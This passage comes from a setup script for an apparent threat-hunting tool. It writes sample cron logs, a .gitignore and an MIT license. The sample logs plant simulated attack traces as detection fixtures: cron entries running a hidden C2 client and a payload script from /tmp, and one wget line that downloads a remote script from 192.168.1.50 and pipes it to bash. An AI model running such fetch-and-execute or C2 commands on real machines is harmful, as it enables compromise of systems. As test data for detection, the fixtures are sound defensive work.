+Jan 15 04:32:00 webserver01 CRON[10102]: (deploy) CMD (python3 /tmp/.hidden/c2_client.py)
+Jan 15 04:33:00 webserver01 crontab[10103]: (deploy) REPLACE
+Jan 15 05:00:00 webserver01 CRON[10200]: (root) CMD (/usr/lib/apt/apt.systemd.daily install)
+Jan 15 05:30:00 webserver01 CRON[10201]: (deploy) CMD (/tmp/payload.sh)
+Jan 15 06:00:00 webserver01 CRON[10300]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
+Jan 15 06:30:00 webserver01 CRON[10301]: (deploy) CMD (/tmp/payload.sh)
+Jan 15 07:00:00 webserver01 CRON[10400]: (root) CMD (/usr/bin/freshclam --quiet)
+Jan 15 07:30:00 webserver01 CRON[10401]: (deploy) CMD (wget -q http://192.168.1.50/update.sh -O /tmp/.update.sh && bash /tmp/.update.sh)
+Jan 15 08:00:00 webserver01 CRON[10500]: (sysadmin) CMD (/usr/local/bin/backup.sh)
+Jan 15 08:30:00 webserver01 crontab[10501]: (sysadmin) LIST
+Jan 15 09:00:00 webserver01 CRON[10600]: (root) CMD (/usr/bin/certbot renew --quiet)
+Jan 15 12:00:00 webserver01 CRON[10700]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+LOGEOF
+
+
+cat > .gitignore << 'GIEOF'
+__pycache__/
+*.pyc
+*.pyo
+*.egg-info/
+dist/
+build/
+.env
+.venv/
+venv/
+*.log.bak
+ltht_report.html
+ltht_report.json
+.idea/
+.vscode/
+*.swp
+*.swo
+*~
+.DS_Store
+Thumbs.db
+GIEOF
+
+cat > LICENSE << 'LICEOF'
+MIT License
+
+Copyright (c) 2026 Larry Odeyemi
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+LICEOF
+
+echo ""
+echo "Setup complete! Files created:"
+echo ""
+ls -la *.py
+echo ""
+ls -la sample_logs/
+echo ""
+echo "Next steps:"
+echo "  1. python run_hunt.py --log-dir sample_logs/"
+echo "  2. git add -A"
+echo "  3. git commit -m 'Add LTHT threat hunt engine, detection rules, and sample logs'"
+echo "  4. git push origin main"
